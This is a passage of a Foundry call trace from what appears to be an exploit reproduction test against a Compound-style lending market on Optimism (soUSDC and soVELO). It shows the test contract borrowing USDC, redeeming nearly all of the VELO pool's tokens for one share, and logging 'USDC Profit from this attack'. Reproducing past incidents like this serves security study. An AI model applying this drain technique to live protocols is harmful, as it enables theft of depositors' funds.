    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5618] 0x16a9FA2FDa030272Ce99B29CF780dFA30361E0f3::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [276] 0xd1Cb03cc31caa72D34dba7eBE21897D9580c4AF0::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [11143] 0x16a9FA2FDa030272Ce99B29CF780dFA30361E0f3::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [7410] 0xd1Cb03cc31caa72D34dba7eBE21897D9580c4AF0::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2901, 100013172 [1e8], 1715720493 [1.715e9], 1715720493 [1.715e9], 2901
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 18446744073709554517 [1.844e19], 100013172 [1e8], 1715720493 [1.715e9], 1715720493 [1.715e9], 18446744073709554517 [1.844e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1000131720000000000000000000000 [1e30]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [8751] 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [585] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::balanceOf(0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1046005468588 [1.046e12]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0, 0, 0, 219145563753097 [2.191e14]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [12470] 0x22C7e5Ce392BC951f63B68a8020B121A8E1C0Fea::getUnderlyingPrice(0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1309] 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F::symbol() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] "soUSDC"
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1118] 0x16a9FA2FDa030272Ce99B29CF780dFA30361E0f3::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [276] 0xd1Cb03cc31caa72D34dba7eBE21897D9580c4AF0::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3143] 0x16a9FA2FDa030272Ce99B29CF780dFA30361E0f3::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1410] 0xd1Cb03cc31caa72D34dba7eBE21897D9580c4AF0::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2901, 100013172 [1e8], 1715720493 [1.715e9], 1715720493 [1.715e9], 2901
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 18446744073709554517 [1.844e19], 100013172 [1e8], 1715720493 [1.715e9], 1715720493 [1.715e9], 18446744073709554517 [1.844e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1000131720000000000000000000000 [1e30]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [4729] 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [563] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::balanceOf(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 35469150965253049864450449 [3.546e25]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0, 2, 0, 17734575482626524932225224500000000000000000 [1.773e43]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [12336] 0x22C7e5Ce392BC951f63B68a8020B121A8E1C0Fea::getUnderlyingPrice(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1309] 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5::symbol() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] "soVELO"
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1095] 0x0f2Ed59657e391746C1a097BDa98F2aBb94b1120::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [253] 0x381FA26795F866c7FE760C0cca682f0f2563ad56::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3235] 0x0f2Ed59657e391746C1a097BDa98F2aBb94b1120::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1502] 0x381FA26795F866c7FE760C0cca682f0f2563ad56::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2294, 12460126 [1.246e7], 1715723663 [1.715e9], 1715723663 [1.715e9], 2294
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 18446744073709553910 [1.844e19], 12460126 [1.246e7], 1715723663 [1.715e9], 1715723663 [1.715e9], 18446744073709553910 [1.844e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 124601260000000000 [1.246e17]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [362] 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F::borrowIndex() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1131576108522846970 [1.131e18]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [429] 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F::totalBorrows() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4788820420824 [4.788e12]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [10406] 0x493f11252dD0eAc438C512c801F331Fda42C9402::notifyBorrowIndex(0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [9660] 0x9117ECd2da25fE1C62C989ed7DC3353a89389b6A::notifyBorrowIndex(0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [362] 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F::borrowIndex() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1131576108522846970 [1.131e18]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [748] 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F::borrowBalanceStored(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit DistributedBorrowerComp(param0: 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F, param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0, param3: 104916239666872922020813522567679558258229956994956 [1.049e50])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [7841] 0x493f11252dD0eAc438C512c801F331Fda42C9402::notifyBorrower(0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [7092] 0x9117ECd2da25fE1C62C989ed7DC3353a89389b6A::notifyBorrower(0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [362] 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F::borrowIndex() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1131576108522846970 [1.131e18]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [748] 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F::borrowBalanceStored(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [585] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::balanceOf(0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1046005468588 [1.046e12]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [34994] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 768947220961 [7.689e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 768947220961 [7.689e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Borrow(borrower: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], borrowAmount: 768947220961 [7.689e11], accountBorrows: 768947220961 [7.689e11], totalBorrows: 5557767641785 [5.557e12])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”њв”Ђ [585] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 768947220961 [7.689e11]
    в”‚   в”‚   в”‚   в”њв”Ђ [0] console::log("usdc_amount_after_borrow", 768947220961 [7.689e11]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [93985] 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5::redeemUnderlying(35469150965253049864450448 [3.546e25])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [563] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::balanceOf(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 35469150965253049864450449 [3.546e25]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [56372] 0x60CF091cD3f50420d50fD7f707414d0DF4751C58::redeemAllowed(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [55661] 0xE8FF1489227fa74f77E49C688903e69E1583C03f::redeemAllowed(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3229] 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [585] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::balanceOf(0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 277058247627 [2.77e11]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0, 0, 768947220961 [7.689e11], 219145563753097 [2.191e14]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [12470] 0x22C7e5Ce392BC951f63B68a8020B121A8E1C0Fea::getUnderlyingPrice(0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1309] 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F::symbol() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] "soUSDC"
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1118] 0x16a9FA2FDa030272Ce99B29CF780dFA30361E0f3::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [276] 0xd1Cb03cc31caa72D34dba7eBE21897D9580c4AF0::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3143] 0x16a9FA2FDa030272Ce99B29CF780dFA30361E0f3::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1410] 0xd1Cb03cc31caa72D34dba7eBE21897D9580c4AF0::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2901, 100013172 [1e8], 1715720493 [1.715e9], 1715720493 [1.715e9], 2901
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 18446744073709554517 [1.844e19], 100013172 [1e8], 1715720493 [1.715e9], 1715720493 [1.715e9], 18446744073709554517 [1.844e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1000131720000000000000000000000 [1e30]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2729] 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [563] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::balanceOf(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 35469150965253049864450449 [3.546e25]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0, 2, 0, 17734575482626524932225224500000000000000000 [1.773e43]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [12336] 0x22C7e5Ce392BC951f63B68a8020B121A8E1C0Fea::getUnderlyingPrice(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1309] 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5::symbol() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] "soVELO"
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1095] 0x0f2Ed59657e391746C1a097BDa98F2aBb94b1120::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [253] 0x381FA26795F866c7FE760C0cca682f0f2563ad56::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3235] 0x0f2Ed59657e391746C1a097BDa98F2aBb94b1120::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1502] 0x381FA26795F866c7FE760C0cca682f0f2563ad56::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2294, 12460126 [1.246e7], 1715723663 [1.715e9], 1715723663 [1.715e9], 2294
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 18446744073709553910 [1.844e19], 12460126 [1.246e7], 1715723663 [1.715e9], 1715723663 [1.715e9], 18446744073709553910 [1.844e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 124601260000000000 [1.246e17]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2463] 0x493f11252dD0eAc438C512c801F331Fda42C9402::notifySupplyIndex(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1717] 0x9117ECd2da25fE1C62C989ed7DC3353a89389b6A::notifySupplyIndex(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [642] 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit DistributedSupplierComp(param0: 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0, param3: 1000000000000000000000000000000000000 [1e36])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [4623] 0x493f11252dD0eAc438C512c801F331Fda42C9402::notifySupplier(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3895] 0x9117ECd2da25fE1C62C989ed7DC3353a89389b6A::notifySupplier(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [642] 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [563] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::balanceOf(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 35469150965253049864450449 [3.546e25]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [22994] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 35469150965253049864450448 [3.546e25])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 35469150965253049864450448 [3.546e25])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, value: 1)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Redeem(redeemer: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], redeemAmount: 35469150965253049864450448 [3.546e25], redeemTokens: 1)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1246] 0x60CF091cD3f50420d50fD7f707414d0DF4751C58::redeemVerify(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 35469150965253049864450448 [3.546e25], 1)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [612] 0xE8FF1489227fa74f77E49C688903e69E1583C03f::redeemVerify(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 35469150965253049864450448 [3.546e25], 1) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”њв”Ђ [563] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 35469150965253049864450448 [3.546e25]
    в”‚   в”‚   в”‚   в”њв”Ђ [0] console::log("Velo_amount_of_Attacker_after_redeem", 35469150965253049864450448 [3.546e25]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [3094] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::transfer(0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5, 35469150965253049864450448 [3.546e25])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5, value: 35469150965253049864450448 [3.546e25])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [11094] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::transfer(0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5, 44656863632 [4.465e10])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5, value: 44656863632 [4.465e10])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [585] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 724290357329 [7.242e11]
    в”‚   в”‚   в”‚   в”њв”Ђ [0] console::log("---------------------------------------------------") [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [0] console::log("USDC Profit from this attack: $", 724290 [7.242e5]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [0] console::log("---------------------------------------------------") [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [585] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::balanceOf(0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4424234269004 [4.424e12]
    в”‚   в”‚   в”њв”Ђ [563] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::balanceOf(0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 35564486528817858126012822 [3.556e25]
    в”‚   в”‚   в”њв”Ђ [2784] 0xF1046053aa5682b4F9a81b5481394DA16BE5FF5a::getFee(0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5, false) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000064
